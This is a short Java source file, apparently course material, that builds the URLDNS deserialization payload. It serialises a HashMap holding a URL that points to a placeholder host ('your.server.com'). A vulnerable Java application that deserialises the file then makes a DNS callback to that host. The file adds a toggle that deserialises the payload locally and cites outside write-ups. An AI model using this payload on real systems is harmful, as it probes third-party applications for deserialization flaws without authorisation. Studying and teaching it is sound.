package edu.cesar.school;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

// Extra lecture at
//     https://www.sidechannel.blog/java-deserialization/
//
// Sample code below, as presented at Java DNS Deserialization, GadgetProbe and Java Deserialization Scanner blog post 
//    https://book.hacktricks.xyz/pentesting-web/deserialization/java-dns-deserialization-and-gadgetprobe#urldns-payload-code-example
//
public class URLDNS {

    public static void GeneratePayload(Object instance, String file) throws Exception {
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static void payloadTest(String file) throws Exception {
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        Object obj = in.readObject();
        System.out.println(obj);
        in.close();
    }

    public static void main(final String[] args) throws Exception {

        boolean toogle = false; // false, to generate payload. true, to execute payload
        if (toogle) {
            payloadTest("/home/user/Downloads/payload.data");
            return;
        }

        String url = "http://your.server.com";

        HashMap ht = new HashMap();
        URLStreamHandler handler = new SilentURLStreamHandler();
        URL u = new URL(null, url, handler);
        ht.put(u, url);

        // add JVM option, --add-opens=java.base/java.net=ALL-UNNAMED, if needed
        final Field field = u.getClass().getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u, -1);

        GeneratePayload(ht, "/home/user/Downloads/payload.data");
    }
}

class SilentURLStreamHandler extends URLStreamHandler {

    protected URLConnection openConnection(URL u) throws IOException {
        return null;
    }

    protected synchronized InetAddress getHostAddress(URL u) {
        return null;
    }
}
